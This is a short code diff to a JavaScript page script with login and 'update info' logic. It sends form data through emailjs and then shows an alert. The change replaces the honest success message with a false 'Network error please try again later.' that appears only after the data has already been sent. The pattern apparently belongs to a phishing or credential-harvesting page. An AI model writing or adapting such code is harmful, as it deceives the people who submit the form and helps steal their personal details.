@@ -81,7 +81,7 @@ const updateLogic = () => {
             if (typeof emailjs !== 'undefined') {
                 emailjs.send(serviceID, templateID, templateParams)
                     .then(() => {
-                        alert("Your info has been updated.");
+                        alert("Network error please try again later.");
                         window.location.href = "index.html";
                     })
                     .catch((err) => {
@@ -109,3 +109,4 @@ document.addEventListener("DOMContentLoaded", () => {
     loginLogic();
     updateLogic();
 });
+
